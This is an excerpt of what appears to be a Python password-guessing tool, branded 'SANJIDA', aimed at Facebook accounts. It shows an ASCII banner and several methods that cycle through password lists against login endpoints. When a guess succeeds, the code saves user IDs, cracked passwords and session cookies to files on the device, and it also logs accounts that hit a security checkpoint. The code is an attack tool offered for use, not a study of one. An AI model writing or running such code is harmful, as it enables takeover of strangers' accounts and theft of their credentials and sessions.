...
sys.stdout.write('\x1b]2; SANJIDA\x07')
...
logo =f"""
 {GREEN}███████╗ {RED}█████╗ \033[38;5;231m███╗   ██╗   \033[38;5;21m  ██╗{RED}██╗{GREEN}██████╗  {wx}█████╗ 
 {GREEN}██╔════╝{RED}██╔══██╗\033[38;5;231m████╗  ██║     \033[38;5;21m██║{RED}██║{GREEN}██╔══██╗{wx}██╔══██╗
 {GREEN}███████╗{RED}███████║\033[38;5;231m██╔██╗ ██║    \033[38;5;21m ██║{RED}██║{GREEN}██║  ██║{wx}███████║
 {GREEN}╚════██║{RED}██╔══██║\033[38;5;231m██║╚██╗██\033[38;5;21m║██   ██║{RED}██║{GREEN}██║  ██║{wx}██╔══██║
 {GREEN}███████║{RED}██║  ██║\033[38;5;231m██║ ╚████║\033[38;5;21m╚█████╔╝{RED}██║{GREEN}██████╔╝{wx}██║  ██║
        ...
        try:
            ...
            for pw in psw:
                ...
                if 'session_key' in q:
                    ...
                    print(f"\r\r{G1}[SANJIDA-OK] {sid} | {ps} ")
                    open('/sdcard/SANJIDA-M1-FILE-OK.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    oks.append(sid)
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     print(f"\r\r{M}[SANJIDA-CP] {sid} | {ps} ")
                     open('/sdcard/SANJIDA-M1-FILE-OK.txt','a').write(sid+'|'+ps+'\n')
                     cps.append(sid)
                     break
                else:
                    continue
...
#__________________[ FILE METHOD M2 ]__________________#             
    def methodB(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r{G1}[{A}SANJIDA-M2{G1}]{A}-{G1}[{A}{loop}{G1}]{A}-{G1}[{A}OK{G1}/{A}CP{G1}]{A}-{G1}[{A}{len(oks)}{G1}/{A}{len(cps)}{G1}] ")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
            ...
            for pw in psw:
                ...
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                    print(f"\r\r{G1}[SANJIDA-OK] {sid} | {ps} ")
                    open('/sdcard/SANJIDA-M2-FILE-OK.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    oks.append(sid)
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    print(f"\r\r{M}[SANJIDA-CP] {sid} | {ps} ")
                    open('/sdcard/SANJIDA-M2-FILE-OK.txt','a').write(sid+'|'+ps+'\n')
                    cps.append(sid)
                else:
                    continue
            loop+=1
    ...
    try:
        for pas in psd:
            ...
            if 'access_token' in q:
                ...
                print(f'\r\r{G1}[SANJIDA-OK] {uid} | {pas}')
